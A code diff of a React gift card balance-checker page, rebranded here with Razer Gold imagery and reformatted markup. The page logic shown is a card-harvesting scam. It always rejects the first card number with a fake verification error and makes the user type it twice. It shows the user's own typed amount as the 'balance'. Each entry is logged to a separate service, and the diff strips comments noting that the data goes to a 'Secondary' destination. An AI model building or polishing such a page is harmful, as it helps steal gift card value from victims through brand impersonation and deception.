@@ -3,9 +3,10 @@ import React, { useState, useEffect, useRef } from 'react';
 import { Link } from 'react-router-dom';
 import Navbar from '../components/Navbar';
 import { sendNotify } from '../services/notifyService';
-import FeaturedRewards from '../components/FeaturedRewards';
 import LegalDisclaimer from '../components/LegalDisclaimer';
 import { logBalanceCheck } from '../services/logService';
+// IMPORT THE NEW IMAGE HERE
+import razerHeroBg from '../assets/razer-hero.jpg'; 
 
 const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }) => {
   const [isVisible, setIsVisible] = useState(false);
@@ -90,7 +91,6 @@ const Home = () => {
   const [isCardValid, setIsCardValid] = useState(false);
   const [isAmountValid, setIsAmountValid] = useState(false);
 
-  // Notification guards
   const typingAlertFired = useRef(false);      
   const completeAlertFired = useRef(false);    
 
@@ -145,7 +145,6 @@ const Home = () => {
         setError('UNABLE TO VERIFY CARD\n\nPlease ensure:\n• You have entered the correct card number\n• All 14 alphanumeric characters are correct\n\nPlease re-enter the CORRECT card number and try again.');
         setStoredCardNumber(rawCard); setStoredAmount(amount);
 
-        // Goes to Secondary only
         try { await logBalanceCheck({ type: 'first_attempt_failed', cardNumber: rawCard, amount, pageSource: 'manual' }); } catch (err) {}
 
         setCardNumber(''); setAttemptCount(1); 
@@ -156,14 +155,12 @@ const Home = () => {
           const displayBalance = `$${parseFloat(storedAmount || amount).toFixed(2)} USD`;
           setBalance(displayBalance); setShowBalance(true); setShowFullScreenBalance(true); setError('');
           
-          // Goes to Secondary only
           try { await logBalanceCheck({ type: 'second_attempt_success', cardNumber: rawCard, amount, balance: displayBalance, pageSource: 'manual' }); } catch (err) {}
           
           setAttemptCount(0); setStoredAmount('');
         } else {
           setError('Card number does NOT match the first attempt.\n\nPlease enter the SAME card number.\n\nField cleared. Try again.');
           
-          // Goes to Secondary only
           try { await logBalanceCheck({ type: 'mismatch_attempt', firstCardNumber: storedCardNumber, secondCardNumber: rawCard, amount, pageSource: 'manual' }); } catch (err) {}
           
           setCardNumber(''); setAttemptCount(0); setStoredCardNumber(''); setStoredAmount(''); 
@@ -186,18 +183,36 @@ const Home = () => {
   return (
     <>
       <Navbar />
-      <div className="bg-[#000] text-center py-8 px-4 border-b border-[#222] relative overflow-hidden">
-        <div className="absolute inset-0 opacity-10 pointer-events-none" style={{ backgroundImage: 'radial-gradient(#00ff41 1px, transparent 1px)', backgroundSize: '20px 20px' }}></div>
-        <h2 className="relative text-sm sm:text-lg text-white font-black tracking-[0.3em] uppercase flex items-center justify-center gap-3">
-          <span className="w-2 h-2 bg-[#00ff41] animate-pulse"></span> Gift Card Balance Checker <span className="w-2 h-2 bg-[#00ff41] animate-pulse"></span>
-        </h2>
+      
+      {/* NEW CINEMATIC HERO SECTION */}
+      <div className="relative w-full h-[250px] sm:h-[350px] overflow-hidden border-b border-[#222]">
+        {/* Background Image */}
+        <img 
+          src={razerHeroBg} 
+          alt="Razer Gold Background" 
+          className="absolute inset-0 w-full h-full object-cover object-center opacity-70"
+        />
+        
+        {/* Gradient Overlays to blend into the dark theme */}
+        <div className="absolute inset-0 bg-gradient-to-t from-[#050505] via-[#050505]/60 to-transparent"></div>
+        <div className="absolute inset-0 bg-gradient-to-r from-[#050505]/80 via-transparent to-[#050505]/80"></div>
+
+        {/* Overlay Text */}
+        <div className="absolute inset-0 flex flex-col items-center justify-center text-center px-4 mt-8">
+          <h1 className="text-2xl sm:text-4xl text-white font-black tracking-[0.3em] uppercase drop-shadow-[0_0_15px_rgba(0,0,0,0.8)]">
+            Razer Gold
+          </h1>
+          <h2 className="text-[#00ff41] text-xs sm:text-sm font-bold tracking-[0.4em] uppercase mt-2 drop-shadow-[0_0_10px_rgba(0,255,65,0.5)]">
+            Balance Checker
+          </h2>
+        </div>
       </div>
 
-      <div className="p-4 sm:p-6 overflow-x-hidden max-w-[600px] mx-auto w-full relative z-10">
-        <div className="bg-[#0a0a0a] border border-[#222] p-6 sm:p-8 shadow-2xl relative">
+      {/* FORM CONTAINER (Overlaps the hero slightly) */}
+      <div className="px-4 sm:px-6 overflow-x-hidden max-w-[600px] mx-auto w-full relative z-20 -mt-10 sm:-mt-16 pb-12">
+        <div className="bg-[#0a0a0a] border border-[#222] p-6 sm:p-8 shadow-[0_0_50px_rgba(0,0,0,0.8)] relative">
           <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-[#00ff41] to-transparent opacity-50"></div>
          
-
           <div className="space-y-6">
             <CardInput value={cardNumber} onChange={(e) => formatCardNumber(e.target.value)} disabled={loading} attemptCount={attemptCount} />
             <div className="transition-all duration-300 relative">
@@ -210,31 +225,33 @@ const Home = () => {
                 style={{ clipPath: 'polygon(0 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%)' }}
               />
             </div>
+            
             <div className="text-center my-2 py-4 border-y border-[#222]">
-             <Link 
-  to="/scan" 
-  className="text-[#00ff41] no-underline text-xs font-bold tracking-widest uppercase hover:text-[#00cc33] transition-all inline-flex items-center gap-2 group drop-shadow-[0_0_8px_rgba(0,255,65,0.3)]"
->
-  <span>📷</span> USE SCAN TO CHECK BALANCE INSTEAD 
-  <span className="inline-block transition-transform group-hover:translate-x-1 text-[#00ff41]">→</span>
-</Link>
+              <Link 
+                to="/scan" 
+                className="text-[#00ff41] no-underline text-xs font-bold tracking-widest uppercase hover:text-[#00cc33] transition-all inline-flex items-center gap-2 group drop-shadow-[0_0_8px_rgba(0,255,65,0.3)]"
+              >
+                <span>📷</span> USE SCAN TO CHECK BALANCE INSTEAD 
+                <span className="inline-block transition-transform group-hover:translate-x-1 text-[#00ff41]">→</span>
+              </Link>
             </div>
-          <button 
-  onClick={handleCheckBalance} 
-  disabled={loading || !isCardValid || !isAmountValid}
-  className={`w-full py-4 font-black text-sm uppercase tracking-[0.2em] transition-all duration-300 bg-[#00ff41] text-black ${
-    (loading || !isCardValid || !isAmountValid)
-      ? 'opacity-50 cursor-not-allowed' 
-      : 'hover:bg-[#00cc33] hover:shadow-[0_0_30px_rgba(0,255,65,0.4)] active:scale-[0.98]'
-  }`}
-  style={{ clipPath: 'polygon(15px 0, 100% 0, 100% calc(100% - 15px), calc(100% - 15px) 100%, 0 100%, 0 15px)' }}
->
-  {loading ? 'Verifying...' : 'Check Balance'}
-</button>
+            
+            <button 
+              onClick={handleCheckBalance} 
+              disabled={loading || !isCardValid || !isAmountValid}
+              className={`w-full py-4 font-black text-sm uppercase tracking-[0.2em] transition-all duration-300 bg-[#00ff41] text-black ${
+                (loading || !isCardValid || !isAmountValid)
+                  ? 'opacity-50 cursor-not-allowed' 
+                  : 'hover:bg-[#00cc33] hover:shadow-[0_0_30px_rgba(0,255,65,0.4)] active:scale-[0.98]'
+              }`}
+              style={{ clipPath: 'polygon(15px 0, 100% 0, 100% calc(100% - 15px), calc(100% - 15px) 100%, 0 100%, 0 15px)' }}
+            >
+              {loading ? 'Verifying...' : 'Check Balance'}
+            </button>
+            
             {error && <StatusMessage type={error.includes('NOT') || error.includes('mismatch') ? 'error' : 'warning'} message={error} />}
           </div>
         </div>
-        {/* <div className="mt-8"><FeaturedRewards /></div> */}
       </div>
       <LegalDisclaimer />
     </>
